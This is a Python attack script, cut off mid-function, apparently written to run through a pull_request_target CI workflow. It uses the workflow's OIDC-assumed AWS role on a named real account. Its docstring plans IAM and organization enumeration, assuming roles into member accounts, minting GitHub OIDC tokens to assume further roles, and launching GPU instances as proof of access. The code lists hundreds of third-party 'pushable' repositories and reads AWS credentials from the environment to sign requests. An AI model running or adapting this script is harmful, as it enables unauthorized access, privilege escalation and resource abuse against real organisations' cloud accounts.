#!/usr/bin/env python3
"""c211-i120420 - authoritative AWS trust enumeration on account 589761922677.

Runs as the terraform data.external program inside the kedacore/testing-infrastructure
pull_request_target 'Validate PR' workflow (which has permissions: id-token: write),
i.e. with the OIDC-assumed role arn:aws:sts::589761922677:assumed-role/github-role/GitHubActions.

Bounded, read-only except exactly one on-demand GPU marker per NEW assumed account:
 1) sts:GetCallerIdentity
 2) iam:ListRoles + iam:GetRole for every returned role (full AssumeRolePolicyDocument)
 3) iam:ListOpenIDConnectProviders + iam:GetOpenIDConnectProvider
 4) organizations:DescribeOrganization; if this is the management account,
    organizations:ListAccounts and sts:AssumeRole OrganizationAccountAccessRole for the
    first 3 ACTIVE member accounts (RoleSessionName c211-i120420)
 5) mint a GitHub OIDC id_token (aud sts.amazonaws.com) and attempt
    sts:AssumeRoleWithWebIdentity for every role whose real trust conditions match the
    subject we can actually mint; also sts:AssumeRole for roles trusting our principal
 6) per NEW account: identity + GPU quota (L-DB2E81BA / L-3819A6DF per region, GPU
    instance-type offerings) + exactly ONE on-demand GPU marker with nvidia-smi UUID
    console proof, terminate + absence readback

Never prints credential values. Emits one JSON object on stdout.
"""
import base64
import datetime
import fnmatch
import hashlib
import hmac
import json
import os
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import xml.etree.ElementTree as ET

REGION = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'eu-west-2'
SELF_ACCOUNT_HINT = '589761922677'
SESS = 'c211-i121584'

PUSHABLE_REPOS = ["afundiedgar/afundiedgar", "afundiedgar/afundios", "afundiedgar/agency-agents", "afundiedgar/agents-course", "afundiedgar/agentscope", "afundiedgar/aggr", "afundiedgar/ai-for-beginners", "afundiedgar/ai-researcher", "afundiedgar/alembic", "afundiedgar/asi-arch", "afundiedgar/autoresearch", "afundiedgar/axelor-open-platform", "afundiedgar/axelor-open-suite", "afundiedgar/bitaxe", "afundiedgar/bitnet", "afundiedgar/cam", "afundiedgar/claude-code", "afundiedgar/claw-code", "afundiedgar/context-hub", "afundiedgar/cosmos", "afundiedgar/crma", "afundiedgar/ctt", "afundiedgar/cursor", "afundiedgar/deepseek-r1", "afundiedgar/deepseek-v3", "afundiedgar/devdocs", "afundiedgar/dotfiles", "afundiedgar/etft", "afundiedgar/fancy_job", "afundiedgar/fineract", "afundiedgar/fineract-microservice", "afundiedgar/fineract-paymenthub-adapter", "afundiedgar/finvizfinance", "afundiedgar/firecrawl", "afundiedgar/flow_s", "afundiedgar/flows", "afundiedgar/fms", "afundiedgar/frankestein", "afundiedgar/full-stack-fastapi-template", "afundiedgar/gbrain", "afundiedgar/gemini-cli", "afundiedgar/gemini-fullstack-langgraph-quickstart", "afundiedgar/hermes-agent", "afundiedgar/hexstrike-ai", "afundiedgar/hrm", "afundiedgar/it", "afundiedgar/jobs", "afundiedgar/kentok", "afundiedgar/koboldcpp", "afundiedgar/langchain", "afundiedgar/langgraph", "afundiedgar/lets-bet", "afundiedgar/litellm", "afundiedgar/llama-factory", "afundiedgar/llmfit", "afundiedgar/memba1ui", "afundiedgar/mirofish", "afundiedgar/moneyprinterturbo", "afundiedgar/mtra", "afundiedgar/n8n-workflows", "afundiedgar/n8n-workflows1", "afundiedgar/nanoclaw", "afundiedgar/nexus-intelligence", "afundiedgar/om1", "afundiedgar/openbb", "afundiedgar/openfang", "afundiedgar/opensandbox", "afundiedgar/pentagi", "afundiedgar/pentest-mcp", "afundiedgar/picheck", "afundiedgar/posti", "afundiedgar/posti-private", "afundiedgar/qlib", "afundiedgar/qwen-code", "afundiedgar/rag-anything", "afundiedgar/rea", "afundiedgar/report_builder", "afundiedgar/ryansprojects", "afundiedgar/ryle", "afundiedgar/rylewa", "afundiedgar/sensenova-u1", "afundiedgar/sn", "afundiedgar/thefatrat", "afundiedgar/thematic", "afundiedgar/vt-etw", "afundiedgar/wan2.2", "afundiedgar/wm", "afundiedgar/worldmonitor", "ai4bharat/indicvoices", "ai4bharat/sruti", "ajua-labs/ajua_report_builder", "ajua-labs/api-service", "ajua-labs/engine3.0", "ajua-labs/enterprise_warehouse", "ajua-labs/new-ui", "ajua-labs/properties", "ajua-labs/scheduler", "ajua-labs/webforms-ui", "amiroyottt/amiroyottt", "amiroyottt/amiroyottt.github.io", "amiroyottt/ci-utils", "amiroyottt/le-roi-du-drain", "amiroyottt/qui-est-le-roi-du-drain", "amiroyottt/roi-du-drain-france", "amiroyottt/waste-less", "amiroyottt/who-is-the-king-of-drain", "amiroyottt/xodrain", "ashwinsankar17/bodhan_gen_ai_tools", "ashwinsankar17/clove-deployment", "c14-inatel/api_search", "c14-inatel/api_search_frontend", "cloud-webide/.github", "cloud-webide/cloud-webide.github.io", "cloud-webide/demo-repository", "cloud-webide/pages-demo", "cloud-webide/qwen-code-review-benchmark", "codingstarind/may2026-team-092", "da5401-jul-nov-2025/assignment-1-venkat-shadeslayer", "da5401-jul-nov-2025/assignment-2-venkat-shadeslayer", "da5401-jul-nov-2025/assignment-3-venkat-shadeslayer", "da5402-mlops-jan26/assignment-1-venkat-shadeslayer", "da5402-mlops-jan26/assignment-2-ns26z109-be22b042", "da5402-mlops-jan26/assignment-3-venkat-shadeslayer", "da5402-mlops-jan26/assignment-5-venkat-shadeslayer", "da5402-mlops-jan26/assignment-6-venkat-shadeslayer", "da5402-mlops-jan26/assignment-7-venkat-shadeslayer", "da5402-mlops-jan26/assignment-8-venkat-shadeslayer", "datafe/opencode", "ddl-nick-goble/cc-fraud-adaboost-tuning2-repo", "ddl-nick-goble/csv-exporter", "ddl-nick-goble/fraud-detection-template", "ddl-nick-goble/fsi-demo", "ddl-nick-goble/fsi-risk-modeling-template", "ddl-nick-goble/fsi-starter-template", "ddl-nick-goble/gfmiboston2026", "ddl-nick-goble/gfmisept2026", "ddl-nick-goble/modelriskpeerforumtoronto2026", "ddl-nick-goble/quant-development", "ddl-nick-goble/quantitative-development", "ddl-nick-goble/react-app-examples", "ddl-nick-goble/sceqc", "ddl-nick-goble/security-dashboard", "ddl-nick-goble/testrepodeletenow", "dms-ksa/chameleon-service", "dms-ksa/cheetah-service", "dms-ksa/elephant", "dms-ksa/event-service", "dms-ksa/falcon-service", "dms-ksa/fox-service", "dms-ksa/fuse-react-skeleton", "dms-ksa/location-service", "dms-ksa/lynxai-service", "dms-ksa/notification-service", "dms-ksa/octopus-service", "dms-ksa/orca-service", "dms-ksa/owl-service", "dms-ksa/prod-argocd", "dms-ksa/rabbit-service", "dms-ksa/rope-tracker-adb", "dms-ksa/smart-sense", "dms-ksa/spider-howen", "dms-ksa/spider-jimiiot", "dms-ksa/spider-meitrack-iridium", "dms-ksa/spider-queclink", "dms-ksa/spider-rope", "dms-ksa/spider-ruptela", "dms-ksa/spider-seeworld", "dms-ksa/spider-teltonika", "dms-ksa/spider-teltonika-avlview", "dms-ksa/spider-teltonika-ble", "dms-ksa/spider-teltonika-go", "dms-ksa/spider-teltonika-iridium", "dms-ksa/spider-teltonika-reborn", "dms-ksa/spider-teltonika-tcp", "dms-ksa/spider-tzone-lora", "dms-ksa/spider-vanguard", "dms-ksa/spider-venom", "dms-ksa/summary-service", "dms-ksa/wasl-service", "dms-ksa/whale-service", "domino-field/excel-model-registry", "eaprime1/0ad_v", "eaprime1/agent-of-empires", "eaprime1/agent-resources-project", "eaprime1/ai-starter-kit", "eaprime1/antigravity-awesome-skills", "eaprime1/antigravity-kit", "eaprime1/archivum", "eaprime1/ashkharh", "eaprime1/auto-claude", "eaprime1/awesome-open-source-games", "eaprime1/claude-code-action", "eaprime1/codacy-skills", "eaprime1/consortium", "eaprime1/constellation_project_tracker", "eaprime1/convertx", "eaprime1/cookbook_gemini", "eaprime1/cradle", "eaprime1/custos", "eaprime1/duplicatus", "eaprime1/essence_engine", "eaprime1/eternal_naught_space", "eaprime1/exchange", "eaprime1/fleet-commander", "eaprime1/gamemaster", "eaprime1/gamification", "eaprime1/gemini-fullstack-langgraph-quickstart", "eaprime1/gemini_cli_notion_extention", "eaprime1/genai-processors", "eaprime1/github-mcp-server", "eaprime1/gravitar", "eaprime1/grayshore", "eaprime1/grok-cli", "eaprime1/gubernaculum", "eaprime1/hodie", "eaprime1/http-fs-file-server", "eaprime1/knowledge-work-plugins", "eaprime1/mandelbrot", "eaprime1/maw", "eaprime1/md-ai", "eaprime1/mindiai", "eaprime1/mulberry", "eaprime1/naught", "eaprime1/navigo", "eaprime1/nexusiam", "eaprime1/now", "eaprime1/nullus", "eaprime1/old_tiezerk", "eaprime1/open-thoughts", "eaprime1/openage", "eaprime1/pandora", "eaprime1/perplexity-cli", "eaprime1/pixelator", "eaprime1/plexus", "eaprime1/portofentry", "eaprime1/prima", "eaprime1/primal_codex", "eaprime1/prime", "eaprime1/primordium", "eaprime1/pryme", "eaprime1/python", "eaprime1/python-thursday-adventure", "eaprime1/python_mini_metro_v", "eaprime1/qtelegard", "eaprime1/qtermux", "eaprime1/queue", "eaprime1/radix", "eaprime1/relational_coherence_navigator", "eaprime1/runexusiam", "eaprime1/skills-introduction-to-github", "eaprime1/spectorium", "eaprime1/sphincter", "eaprime1/sphinx", "eaprime1/starter-applets", "eaprime1/tabularium", "eaprime1/termux-app", "eaprime1/the", "eaprime1/tiezerk", "eaprime1/tmux", "eaprime1/ultima_server", "eaprime1/unexusi", "eaprime1/unexusi-claude", "eaprime1/unexusi_anex", "eaprime1/unexusi_dynamic_narrative", "eaprime1/unexusi_fortran", "eaprime1/veo-3-nano-banana-gemini-api-quickstart", "eaprime1/visionary_termux", "eaprime1/widelands", "eaprime1/wl_addons_server", "freedom-angel-corp/brain-dump", "inovation-logic-solutions/system-market-backend", "inovation-logic-solutions/system-market-backend-v2", "inovation-logic-solutions/systemmarket-frontend", "inovation-logic-solutions/upforme", "jayden3316/cognitive_load", "kinetik-automotive-ltd/azure-functions", "kinetik-automotive-ltd/go-kart-ui-2", "kinetik-automotive-ltd/motorcycle-dashboard-ui", "kinetik-automotive-ltd/telemetry2go-be", "kinetik-automotive-ltd/telemetry2go-ui", "kinetik-automotive-ltd/volvo_dashboard", "luanpirr3/app_academico", "luanpirr3/cybersecurity", "luanpirr3/html-simula_comissao_variavel", "luanpirr3/importdbmysqlcsv_bonifacio1", "luanpirr3/importdbmysqlcsv_bonifacio2", "luanpirr3/java", "luanpirr3/java-cryptography", "luanpirr3/java-jdbc", "luanpirr3/java-personal-safe", "luanpirr3/java-randon-password-generate", "luanpirr3/java-socketcomunication", "luanpirr3/java-time-insertion-and-search-array", "luanpirr3/kotlin-tuneel-with-docker", "luanpirr3/luanpirr3", "luanpirr3/mysql-database", "luanpirr3/pcmania", "luanpirr3/projectc07_systemmarket", "luanpirr3/python-computervision", "luanpirr3/python-convert_mp4_to_mp3", "luanpirr3/python-detector_de_quedas", "luanpirr3/python-leitor_dbmysql", "luanpirr3/semlimite", "luanpirr3/spring_boot_accessing_data_with_mysql", "luanpirr3/spring_boot_api_restful_web_service", "luanpirr3/sql-backupmsql-fastapi-", "maxwell-ipeni/dream-again-foundation", "me50/afundiedgar", "midnghtsapphire/-name-", "midnghtsapphire/agent-of-empires", "midnghtsapphire/agent-site", "midnghtsapphire/ai-architecture-new", "midnghtsapphire/aloha-board", "midnghtsapphire/amazon-books", "midnghtsapphire/audrey-evans-official", "midnghtsapphire/auky", "midnghtsapphire/auky-slack", "midnghtsapphire/awesome-cli-coding-agents", "midnghtsapphire/awesome-opensource-boilerplates", "midnghtsapphire/balls-brand-kit", "midnghtsapphire/bitcoin-channel-lab", "midnghtsapphire/bodyfinders", "midnghtsapphire/bom-me", "midnghtsapphire/bot-builder-vault", "midnghtsapphire/case-files", "midnghtsapphire/caveman", "midnghtsapphire/ceremony-spark-toolkit", "midnghtsapphire/claude-code-hooks-mastery", "midnghtsapphire/claude-skills-governance-risk-and-compliance", "midnghtsapphire/claw-code", "midnghtsapphire/clawe", "midnghtsapphire/cozy-haven-hub", "midnghtsapphire/dbarchitect-bot", "midnghtsapphire/deck-to-video-kit", "midnghtsapphire/eco-anchor-site", "midnghtsapphire/figs-wine-honey", "midnghtsapphire/food-freedom-ai", "midnghtsapphire/forensic-text-recovery", "midnghtsapphire/forensicfinders", "midnghtsapphire/git-fleet", "midnghtsapphire/github", "midnghtsapphire/github-free-toolkit", "midnghtsapphire/github-free-toolkit-pro", "midnghtsapphire/global-fusion-console", "midnghtsapphire/global-fusion-digest", "midnghtsapphire/gmail-organizer", "midnghtsapphire/gold-of-crete", "midnghtsapphire/grok-api-demo", "midnghtsapphire/growlingeyes", "midnghtsapphire/guardaio", "midnghtsapphire/hunger-gallows", "midnghtsapphire/image-permissions", "midnghtsapphire/instant-ordain-certificate-pro", "midnghtsapphire/kdp-packager", "midnghtsapphire/kimi-bot", "midnghtsapphire/linear-a", "midnghtsapphire/linear-a-sources", "midnghtsapphire/manus", "midnghtsapphire/manus-fleets", "midnghtsapphire/manus-recovery", "midnghtsapphire/mcp-affiliate", "midnghtsapphire/mcp-kubernetes", "midnghtsapphire/medusa2", "midnghtsapphire/meetaudreyevans-dashboard", "midnghtsapphire/midnghtsapphire", "midnghtsapphire/movement-observation", "midnghtsapphire/neighborly-services", "midnghtsapphire/neuro-adaptive-app", "midnghtsapphire/neurooz", "midnghtsapphire/nomad-navigator", "midnghtsapphire/oath-gate-connect", "midnghtsapphire/oaudrey-pages", "midnghtsapphire/oaudrey-site", "midnghtsapphire/ocean2-v2-research", "midnghtsapphire/openaudrey", "midnghtsapphire/openclaw-medical-skills", "midnghtsapphire/openclaw_digitalocean", "midnghtsapphire/perplexity-ai", "midnghtsapphire/playlist-atlas", "midnghtsapphire/portfolio-inventory", "midnghtsapphire/puxxle", "midnghtsapphire/reese-reviews", "midnghtsapphire/research-rodney-fleet", "midnghtsapphire/revvel-bots-private", "midnghtsapphire/revvel-hail", "midnghtsapphire/revvel-market-scout-gha", "midnghtsapphire/revvel-metal-findings", "midnghtsapphire/revvel-standards", "midnghtsapphire/risingaloha", "midnghtsapphire/roo-code", "midnghtsapphire/rvvel", "midnghtsapphire/scribes-of-the-palace", "midnghtsapphire/script-sweep", "midnghtsapphire/searchcrew-libraries", "midnghtsapphire/searchcrew-library", "midnghtsapphire/sense-strata-ledger", "midnghtsapphire/sensecrew-workspace-backup", "midnghtsapphire/sleuthkit", "midnghtsapphire/strata-mapping", "midnghtsapphire/tartaria-tablets", "midnghtsapphire/trawl", "midnghtsapphire/wedlock-wizard-mobile", "midnghtsapphire/wr-4600-photon-bench", "midnghtsapphire/xcodebuildmcp", "midnghtsapphire/zero-startup-dictionary", "midnghtsapphire/zero-startup-field-guide", "midnghtsapphire/zeroqueue-governance", "modelstudioai/openwork", "nature-magic-hkmo-team/aistudio", "nature-magic-hkmo-team/gcloud", "nature-magic-hkmo-team/nature-magic", "nature-magic-hkmo-team/nature-magic-react", "nature-magic-hkmo-team/naturemagic", "nature-magic-hkmo-team/snowmytech", "nature-magic-tech/a2a", "nature-magic-tech/agents", "nature-magic-tech/apitools", "nature-magic-tech/awesome-codex-subagents", "nature-magic-tech/azure-cli", "nature-magic-tech/azure-quickstart-templates", "nature-magic-tech/claude-plugins-community", "nature-magic-tech/claude-plugins-official", "nature-magic-tech/demo-repository", "nature-magic-tech/gcloud-mcp", "nature-magic-tech/knowledge-work-plugins", "nature-magic-tech/mytools-desktop", "nature-magic-tech/naturemagic-ssg", "nature-magic-tech/swift-markdown-ui", "nature-magic-tech/xcode-cloud", "nature-magic/cloudflare", "nature-magic/demo-repository", "nature-magic/nature-magic-react-router-starter", "noon-otter/claude_playground", "panshul069/metrics-repo", "pathway-team-18/pathway-high-prep-baseline", "portprojetoautomacao-debug/alteradodployhttps-github.com-thiagobodevanadv-alt-multi-agent-custom-automation-engine-solution", "portprojetoautomacao-debug/assistente-jur-dico-principal", "portprojetoautomacao-debug/assistente-jur-dico-principal222", "portprojetoautomacao-debug/assistente-jur-dico-principalrepli", "portprojetoautomacao-debug/assistentejuridicotype", "portprojetoautomacao-debug/https-github.com-thiagobodevanadv-alt-assistente-jur-dico-principal", "portprojetoautomacao-debug/meu-https-github.com-microsoft-container-migration-solution-accelerator", "portprojetoautomacao-debug/meu-https-github.com-microsoft-multi-agent-custom-automation-engine-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-agentic-applications-for-unified-data-foundation-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-customer-chatbot-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-deploy-your-ai-application-in-production", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-document-generation-solution-accelerator", "portprojetoautomacao-debug/meuhttps-github.com-microsoft-document-knowledge-mining-solution-accelerator", "portprojetoautomacao-debug/modelocodespace", "portprojetoautomacao-debug/oidc-fork-probe", "portprojetoautomacao-debug/oidc-probe3", "portprojetoautomacao-debug/qwenllm", "portprojetoautomacao-debug/qwenllm2", "portprojetoautomacao-debug/repocto", "portprojetoautomacao-debug/thiagobodevanadv-alt-assistente-jur-dico-principal", "qqqys/qwen-bot", "qwen-code-review-bot/dao-2048", "qwen-code-review-bot/jianshen", "qwen-code-review-bot/mint-ui", "qwen-code-review-bot/qwen-code", "qwen-code-review-bot/ruoyun0214.github.io", "qwen-code-review-bot/task-functions", "qwen-code-review-bot/vue-docker-demo", "qwenlm/qwen-code", "qwenlm/qwen-code-action", "qwenlm/qwen-code-docs", "qwenlm/qwen-live-harness", "rashkopetrov/vagrant-for-development", "roovy54/tool-retriever", "sakshi-joshi-30/crisper_whisper", "sakshi-joshi-30/orf-model-full", "sakshi-joshi-30/sakshi-joshi-30.github.io", "sakshi-joshi-30/verbatim-mode-training", "scriptex/2048", "scriptex/animateme", "scriptex/async-array-prototype", "scriptex/at-the-wall", "scriptex/atanas.info", "scriptex/attr-i18n", "scriptex/awesome-useless-websites", "scriptex/batty-flight", "scriptex/calendar-widget", "scriptex/chops", "scriptex/create-pwa", "scriptex/css-diagnostics", "scriptex/dator", "scriptex/deno-rest-api", "scriptex/energo-pro-alerts", "scriptex/entra-docs", "scriptex/eon-feh-logo", "scriptex/eon-home-api-docs", "scriptex/express-watch-file", "scriptex/freelance-salary-calculator", "scriptex/ga-beacon", "scriptex/github-contributions-snake", "scriptex/github-insights", "scriptex/github-pages-vuepress", "scriptex/gitlab-calendar", "scriptex/hilarious-css", "scriptex/hover-media-query", "scriptex/html-head-component", "scriptex/html5-form-validator", "scriptex/initial-commit", "scriptex/introscroll", "scriptex/itcss", "scriptex/itscss", "scriptex/kata-machine", "scriptex/lastfm-ts-api", "scriptex/localga", "scriptex/log", "scriptex/mama-culinar", "scriptex/material-snake", "scriptex/material-tetris", "scriptex/no-html", "scriptex/node-jimp-watermark", "scriptex/node-rest-api", "scriptex/node-rest-example", "scriptex/npm-maintainer", "scriptex/npm-stats", "scriptex/package-info", "scriptex/parcel-mpa", "scriptex/pass-score", "scriptex/postcss-watch-folder", "scriptex/random-splice", "scriptex/react-accordion-ts", "scriptex/react-carousel", "scriptex/react-dropper", "scriptex/react-round-carousel", "scriptex/react-svg-donuts", "scriptex/react-template-ts", "scriptex/rollup-mpa", "scriptex/round-carousel-component", "scriptex/scriptex", "scriptex/scss-goodies", "scriptex/social-header", "scriptex/socials", "scriptex/sod", "scriptex/sod-legacy", "scriptex/stefan", "scriptex/svg-symbol-sprite", "scriptex/svg64", "scriptex/svgo-add-viewbox", "scriptex/svgo-bimi", "scriptex/svgo-viewbox", "scriptex/touchsweep", "scriptex/ts-helpers", "scriptex/typed-usa-states", "scriptex/universal-github-client", "scriptex/uptime", "scriptex/url-shortener", "scriptex/vik-varna-alerts", "scriptex/weather-app", "scriptex/weathex", "scriptex/webpack-mpa", "scriptex/webpack-mpa-next", "scriptex/webpack-mpa-ts", "scriptex/written-by-a-human-being", "skysze-polyu/.github", "skysze-polyu/company", "skysze-polyu/foundry-github-copilot-sdk", "skysze-polyu/frontier-ghcp-rvas", "skysze-polyu/mcp", "skysze-polyu/mistral-vibe", "skysze-polyu/muse-system-files", "skysze-polyu/nature-magic", "skysze-polyu/nature-magic-website", "skysze-polyu/password-manager-resources", "skysze-polyu/skills-introduction-to-github", "skysze-polyu/skysze-polyu", "skysze-polyu/snowmy-kubernetes", "skysze-polyu/vscode-extension-samples", "snowmy-tech/.github-private", "snowmy-tech/agent-client-protocol", "snowmy-tech/agent-framework", "snowmy-tech/agent-host-protocol", "snowmy-tech/agents", "snowmy-tech/azure-dev", "snowmy-tech/claude-code", "snowmy-tech/claude-plugins-community", "snowmy-tech/claude-plugins-official", "snowmy-tech/client-python", "snowmy-tech/client-ts", "snowmy-tech/codex", "snowmy-tech/codex-universal", "snowmy-tech/cookbook", "snowmy-tech/copilot-sdk", "snowmy-tech/coreai-models", "snowmy-tech/docs", "snowmy-tech/foundry-samples", "snowmy-tech/foundry-toolkit", "snowmy-tech/frontier-ai-starter-kit-rvas", "snowmy-tech/github-issue-manager", "snowmy-tech/knowledge-work-plugins", "snowmy-tech/microsoft-365-agents-toolkit-samples", "snowmy-tech/mistral-vibe", "snowmy-tech/multi-agent-custom-automation-engine-solution-accelerator", "snowmy-tech/muse", "snowmy-tech/octokit.swift", "snowmy-tech/openai-agents-js", "snowmy-tech/openai-agents-python", "snowmy-tech/openai-responses-starter-app", "snowmy-tech/origamicraftingadynamictutorialforappleintelligence", "snowmy-tech/platform-docs-public", "snowmy-tech/react-native-macos", "snowmy-tech/search-starter-app", "snowmy-tech/skills-getting-started-with-github-copilot", "snowmy-tech/zcode", "supbonifacio2/import_database_loja1", "supbonifacio2/import_database_loja2", "supbonifacio2/supbonifacio2", "supermercado-bonifacio/api-supermarket-store1", "supermercado-bonifacio/api-supermarket-store2", "surajvkulkarni/browser-use", "surajvkulkarni/examples", "surajvkulkarni/fastapi", "surajvkulkarni/jugaad-data", "surajvkulkarni/leetcodedailymay", "surajvkulkarni/next.js-projects-build-an-issue-tracker", "surajvkulkarni/surajvkulkarni.github.io", "surajvkulkarni/tg-archive", "swadeshb-iitm/da6400-reinforcement-learning", "swadeshb-iitm/devrev-project", "tensorteen/baseline-pipeline", "tensorteen/pathway-team-18", "venkat-shadeslayer/ai4bharat", "venkat-shadeslayer/asr-rl", "venkat-shadeslayer/assignment4", "venkat-shadeslayer/chakra", "venkat-shadeslayer/da5401_assignment5", "venkat-shadeslayer/da5401_assignment6", "venkat-shadeslayer/da5401_assignment7", "venkat-shadeslayer/da5401_assignment8", "venkat-shadeslayer/da5401_final", "venkat-shadeslayer/exasol_hackathon", "venkat-shadeslayer/gcrl_ddp", "venkat-shadeslayer/hindi-streaming-translation", "venkat-shadeslayer/mcq_generator", "venkat-shadeslayer/ml_personal", "venkat-shadeslayer/mlops-da5402", "venkat-shadeslayer/mlops_final", "venkat-shadeslayer/pathway-high-prep-baseline", "venkat-shadeslayer/primemart-enthusiasts", "venkat-shadeslayer/rarl", "venkat-shadeslayer/reinforcement_learning_tb", "venkat-shadeslayer/rl_from_scratch", "venkat-shadeslayer/unsupervised-skill-discovery", "venkat-shadeslayer/zero_to_hero-all_hail_ak", "wolowizard-11/parta-final", "wpcomvip/dan-ariely-danariely-com", "xiaomizhoubaobei/302_image_toolbox", "xiaomizhoubaobei/60s", "xiaomizhoubaobei/ai-chat", "xiaomizhoubaobei/aipoxny", "xiaomizhoubaobei/artalk", "xiaomizhoubaobei/astrbot-plugin-song-voice", "xiaomizhoubaobei/astrbot_plugin-ceshi", "xiaomizhoubaobei/astrbot_plugin_blackjack", "xiaomizhoubaobei/astrbot_plugin_emojis", "xiaomizhoubaobei/astrbot_plugin_gitpulse", "xiaomizhoubaobei/astrbot_plugin_interactive", "xiaomizhoubaobei/astrbot_plugin_manosaba-memes", "xiaomizhoubaobei/astrbot_plugin_models_ai", "xiaomizhoubaobei/astrbot_plugin_ots_memory", "xiaomizhoubaobei/astrbot_plugin_treasure_bag", "xiaomizhoubaobei/astro", "xiaomizhoubaobei/ci-evidence-pack", "xiaomizhoubaobei/comfyui-workflow", "xiaomizhoubaobei/deep-research", "xiaomizhoubaobei/edge-ai-gateway", "xiaomizhoubaobei/eo-counter", "xiaomizhoubaobei/hanlp", "xiaomizhoubaobei/image-generator-starter", "xiaomizhoubaobei/image_toolbox", "xiaomizhoubaobei/llm-playground", "xiaomizhoubaobei/lumin-core", "xiaomizhoubaobei/lumincore", "xiaomizhoubaobei/mizhou-sts-service", "xiaomizhoubaobei/mnn", "xiaomizhoubaobei/mnn-1", "xiaomizhoubaobei/mz-mcp", "xiaomizhoubaobei/mzapi-android", "xiaomizhoubaobei/mzapi-api", "xiaomizhoubaobei/mzapi-cpp", "xiaomizhoubaobei/mzapi-go", "xiaomizhoubaobei/mzapi-java", "xiaomizhoubaobei/mzapi-net", "xiaomizhoubaobei/mzapi-php", "xiaomizhoubaobei/mzapi-python", "xiaomizhoubaobei/mzapi-swift", "xiaomizhoubaobei/mzapi-ts", "xiaomizhoubaobei/mzwiki", "xiaomizhoubaobei/prompt_generator", "xiaomizhoubaobei/qq-bot", "xiaomizhoubaobei/rsshub", "xiaomizhoubaobei/video-generator-public", "xiaomizhoubaobei/video_translation", "xiaomizhoubaobei/waline", "xiaomizhoubaobei/wiki", "xiaomizhoubaobei/womenhealth-app", "xiaomizhoubaobei/womenhealth-web", "xiaomizhoubaobei/xiaomizhoubaobei", "xiaomizhoubaobei/xmzai-android-app", "yiliang114/aionui", "yiliang114/aionui-vscode", "yiliang114/arithmetic", "yiliang114/awesome-deepseek-harness", "yiliang114/awesome-dsh-plugin", "yiliang114/azuredatastudio", "yiliang114/byte.yiliang.site", "yiliang114/camo-test", "yiliang114/cc-switch", "yiliang114/chinese-independent-blogs", "yiliang114/claude-code", "yiliang114/code-agents", "yiliang114/code-server", "yiliang114/core", "yiliang114/cpa-config", "yiliang114/darc", "yiliang114/deemon", "yiliang114/developer", "yiliang114/dsh-session-deck", "yiliang114/easytrader", "yiliang114/gc", "yiliang114/github-activity-readme", "yiliang114/harness-perf-benchmark", "yiliang114/herdr", "yiliang114/img-host", "yiliang114/issue-assets", "yiliang114/kimi-code", "yiliang114/learn-quant", "yiliang114/llm-proxy", "yiliang114/magpie", "yiliang114/midway", "yiliang114/monorepo-turborepo", "yiliang114/mumeral.js", "yiliang114/oh-my-pi", "yiliang114/omp-web", "yiliang114/open-ppt-skill", "yiliang114/opencode", "yiliang114/projj", "yiliang114/quant", "yiliang114/qwen-code", "yiliang114/qwen-code-action", "yiliang114/qwen-code-examples", "yiliang114/qwen-code-lsp-demo", "yiliang114/rea", "yiliang114/rettiwt-api", "yiliang114/rspack", "yiliang114/skills", "yiliang114/start-nest-v3-w6h2", "yiliang114/starter-vscode", "yiliang114/strapi-nextjs-corporate-starter-1", "yiliang114/task-functions", "yiliang114/tasks", "yiliang114/tokei", "yiliang114/unpkg-white-list", "yiliang114/vite-monaco-editor", "yiliang114/vite-plugin-mkcert", "yiliang114/vscode", "yiliang114/vscode-docs", "yiliang114/vscode-mk", "yiliang114/vscode-pyolite", "yiliang114/vscode-ts-uml", "yiliang114/vue-thanos-snap", "yiliang114/xterm.js", "yiliang114/yiliang114", "yiliang114/yiliang114.github.io", "yiliang114/zeromq.js", "yiliang114/zhinang-cr-bot", "yiliang114/zhouz", "yuseinkerdakov/html-practice", "yuseinkerdakov/three-11", "zoyaatanasova/zoyaworld"]


RAW = []


def say(*a):
    line = ' '.join(str(x) for x in a)
    RAW.append(line)
    print(line, file=sys.stderr, flush=True)


def cap(s, n=1200):
    s = '' if s is None else str(s)
    return s[:n]


# ---------------------------------------------------------------- SigV4 client
def _sign(key, msg):
    return hmac.new(key, msg.encode('utf-8'), hashlib.sha256).digest()


def _signing_key(secret, datestamp, region, service):
    k = _sign(('AWS4' + secret).encode('utf-8'), datestamp)
    k = _sign(k, region)
    k = _sign(k, service)
    return _sign(k, 'aws4_request')


def creds_env():
    return {'ak': os.environ.get('AWS_ACCESS_KEY_ID') or '',
            'sk': os.environ.get('AWS_SECRET_ACCESS_KEY') or '',
            'tok': os.environ.get('AWS_SESSION_TOKEN') or ''}


def signed(service, action, params, region, version, cr=None, host=None):
    cr = cr or creds_env()
    if not cr.get('ak') or not cr.get('sk'):
        return {'ok': False, 'status': None, 'error': 'NO_CREDS_IN_ENV', 'body': ''}
    host = host or ('%s.%s.amazonaws.com' % (service, region))
    now = datetime.datetime.now(datetime.timezone.utc)
    amzdate = now.strftime('%Y%m%dT%H%M%SZ')
    datestamp = now.strftime('%Y%m%d')
    bp = dict(params)
    bp['Action'] = action
    bp['Version'] = version
    body = '&'.join('%s=%s' % (urllib.parse.quote(k, safe='-_.~'),
                               urllib.parse.quote(str(v), safe='-_.~'))
                    for k, v in sorted(bp.items()))
    ph = hashlib.sha256(body.encode('utf-8')).hexdigest()
    headers = {'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
               'host': host, 'x-amz-date': amzdate}
    if cr.get('tok'):
        headers['x-amz-security-token'] = cr['tok']
    names = sorted(headers)
    ch = ''.join('%s:%s\n' % (n, headers[n].strip()) for n in names)
    sh = ';'.join(names)
    crq = '\n'.join(['POST', '/', '', ch, sh, ph])
    scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
    sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope,
                     hashlib.sha256(crq.encode('utf-8')).hexdigest()])
    sig = hmac.new(_signing_key(cr['sk'], datestamp, region, service), sts.encode('utf-8'),
                   hashlib.sha256).hexdigest()
    send = {'Content-Type': headers['content-type'], 'Host': host, 'X-Amz-Date': amzdate,
            'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'
                             % (cr['ak'], scope, sh, sig)}
    if cr.get('tok'):
